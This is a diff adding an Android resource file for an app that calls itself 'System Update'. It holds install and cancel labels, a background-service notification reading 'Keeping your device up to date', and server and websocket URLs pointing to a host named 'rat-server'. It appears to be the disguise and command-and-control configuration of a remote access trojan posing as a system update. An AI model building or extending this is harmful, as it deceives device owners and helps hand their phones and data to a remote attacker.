@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="black">#000000</color>
+    <color name="white">#FFFFFF</color>
+    <string name="app_name">System Update</string>
+    <string name="btn_cancel">Cancel</string>
+    <string name="btn_install">Install Update</string>
+    <string name="notification_channel_desc">Background service for system operations</string>
+    <string name="notification_channel_name">System Service</string>
+    <string name="notification_text">Keeping your device up to date</string>
+    <string name="notification_title">System Update Running</string>
+    <string name="server_url" translatable="false">https://rat-server-vc9p.onrender.com</string>
+    <string name="ws_url" translatable="false">https://rat-server-vc9p.onrender.com</string>
+    <style name="Theme.SystemUpdate" parent="Theme.MaterialComponents.NoActionBar">
+        <item name="colorPrimary">@color/white</item>
+        <item name="colorPrimaryVariant">@color/white</item>
+        <item name="colorOnPrimary">@color/black</item>
+        <item name="colorSecondary">@color/white</item>
+        <item name="colorSecondaryVariant">@color/white</item>
+        <item name="colorOnSecondary">@color/black</item>
+        <item name="android:statusBarColor">@android:color/transparent</item>
+        <item name="android:navigationBarColor">@android:color/transparent</item>
+    </style>
+</resources>
